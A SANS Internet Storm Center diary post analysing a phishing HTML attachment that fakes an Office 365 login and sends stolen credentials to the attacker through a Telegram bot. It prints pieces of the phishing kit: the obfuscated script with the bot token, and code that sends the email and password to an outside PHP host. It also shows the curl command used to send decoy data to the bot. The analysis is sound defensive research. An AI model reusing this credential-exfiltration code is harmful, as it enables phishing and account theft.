---
title: Simple HTML Phishing via Telegram Bot, (Wed, Feb 8th)
url: https://isc.sans.edu/diary/rss/29528
source: SANS Internet Storm Center, InfoCON: green
date: 2023-02-09
fetch_date: 2025-10-04T06:10:45.773982
---

# Simple HTML Phishing via Telegram Bot, (Wed, Feb 8th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29522)
* [next](/diary/29530)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/cloudsecnext-summit-2025/course/application-security-securing-web-apps-api-microservices) | Denver | Oct 4th - Oct 9th 2025 |

# [Simple HTML Phishing via Telegram Bot](/forums/diary/Simple%2BHTML%2BPhishing%2Bvia%2BTelegram%2BBot/29528/)

**Published**: 2023-02-08. **Last Updated**: 2023-02-08 13:56:11 UTC
**by** [Johannes Ullrich](https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

[1 comment(s)](/diary/Simple%2BHTML%2BPhishing%2Bvia%2BTelegram%2BBot/29528/#comments)

Monday, I wrote about the use of IP lookup [APIs](https://isc.sans.edu/diary/APIs%20Used%20by%20Bots%20to%20Detect%20Public%20IP%20address/29516) by bots. It turns out that it is not just bots using these APIs, but phishing e-mails are also taking advantage of them.

The phish itself is not particularly remarkable. It is arriving as an email claiming to include a payment confirmation. The email includes a small thread of messages likely to make it more plausible. The best I can guess, the email is supposed to make the recipient curious to open the attachment. The attachment itself is a simple HTML file simulating an Office 365 page.

![](https://isc.sans.edu/diaryimages/images/Screenshot%202023-02-08%20at%207_57_42%20AM.png)

The email address is prefilled.

Let's take a look at the HTML file. It starts with:

> `<script>
>     \u0065ma\u0069\u006c="[[email protected]](/cdn-cgi/l/email-protection)";
>     var t\u006f\u006be\u006e='5726079562:AAFyQSm_2dYxj6NHVjHY8L8zy96fyeyykKs';
>     var \u0063\u0068at_id=1512976710;
>     var data=atob("PGh0bWwgbGFuZz0iZW4iPjxo...`

"data" is the actual HTML/JavaScript content. "atob" will Base64 decode the string. The second variable ("token") represents the Telegram credentials used later. "chat\_id" is the Telegram ID of the attacker receiving the credentials.

Here are a few of the notable snippets of JavaScript after decoding it:

> `<script>
>     $(document).ready(function() {
>       $.getJSON("https://api.ipify.org?format=json", function(data) {$("#gfg").html(data.ip);})
>           var textField = document.getElementById("username");
>           textField.value = email;
>           });
>     </script>`

This function will run after the document is rendered in the browser. It contacts "ipify.org" to retrieve the victims public IP address. This could be used to eliminate duplicate submissions, or to learn more about the victim.

> `body {
>   margin: 0;
>   padding: 0;
>   background: url(https://i.gyazo.com/214d89a26f0ac918a09f216a1b0f97b4.png);
>   background-size: cover;
>   font-family: sans-serif;
> }`

This is how the blurred background image is loaded. Interestingly, we received reports lately about a blurred image from our site being used in similar phishing attacks. Let us know if you come across a phish using our image (working on auto-replacing it with a warning).

Oddly, the code implements two different methods to exfiltrate the username and password. But only one of them is used. The first method would simply send the username and password to "spiritualstraighttalk.com":

> `var setting = {
>          "async": true,
>          "crossDomain": true,
>          "dataType": 'JSONP',
>          "url": "https://spiritualstraighttalk.com/phpsender.php?email={email}&password={password}",
>          "method": "GET",
>          "headers": {"Content-Type": "application/json; charset=utf-8", "cache-control": "no-cache", 'Access-Co
> ntrol-Allow-Origin': '*' },
>          "data": {"email": email, "password": password}`
>
> `}`

The second method uses Telegram's API, and this code is actually used. The message sent:

> `{
>     "ok": true,
>     "result": {
>         "message_id": 374,
>         "from": {
>             "id": 5726079562,
>             "is_bot": true,
>             "first_name": "SharepointDOGGY",
>             "username": "SharepointDOGGY_bot"
>         },
>         "chat": {
>             "id": 1512976710,
>             "first_name": "Newage officePat",
>             "type": "private"
>         },
>         "date": 1675861110,
>         "text": "====== Office Excel ======\nEmail: [[email protected]](/cdn-cgi/l/email-protection)\nPassword: phishphuck\nIP: https://ip-api.com/[redacted]\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15\n===================",
>         "entities": [
>             {
>                 "offset": 34,
>                 "length": 21,
>                 "type": "email"
>             },
>             {
>                 "offset": 81,
>                 "length": 31,
>                 "type": "url"
>             }
>         ]
>     }
> }`

Not sure why the first method was left in place, but it was likely too much work to remove it; instead, the second method was just added.

After running this script a few times, the attacker blocked the bot from sending any more credentials:

> `d=$(date +%s)
> curl 'https://api.telegram.org/bot5726079562:AAFyQSm_2dYxj6NHVjHY8L8zy96fyeyykKs/sendMessage' \
> -X 'POST' \
> -H 'Accept: */*' \
> -H 'Content-Type: application/json' \
> -H 'Origin: null' \
> -H 'Cache-Control: no-cache' \
> -H 'Accept-Language: en-US,en;q=0.9' \
> -H 'Host: api.telegram.org' \
> -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15' \
> -H 'Accept-Encoding: gzip, deflate, br' \
> -H 'Connection: keep-alive' \
>      --data-binary '{"chat_id":1512976710,"text":"====== Office Excel ======\r\nEmail: phishphuck\r\nPassword: phishphuck\r\nIP: https://ip-api.com/127.0.0.1\r\nUser-Agent: phishphuck\r\n==================="}'`

---
Johannes B. Ullrich, Ph.D. , Dean of Research, [SANS.edu](https://sans.edu)
[Twitter](https://jbu.me/164)|

Keywords:

[1 comment(s)](/diary/Simple%2BHTML%2BPhishing%2Bvia%2BTelegram%2BBot/29528/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/cloudsecnext-summit-2025/course/application-security-securing-web-apps-api-microservices) | Denver | Oct 4th - Oct 9th 2025 |

* [previous](/diary/29522)
* [next](/diary/29530)

### Comments

Just to share my findings after testing, SNORT will detect the API connection and DNS lookup with the following rules:

https://rules.emergingthreatspro.com/open/
1:2033967 ET INFO Observed Telegram API Domain (api .telegram .org in TLS SNI)
1:2033966 ET INFO Telegram API Domain in DNS Lookup

#### Mark G

#### Feb 9th 2023 2 years ago

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html...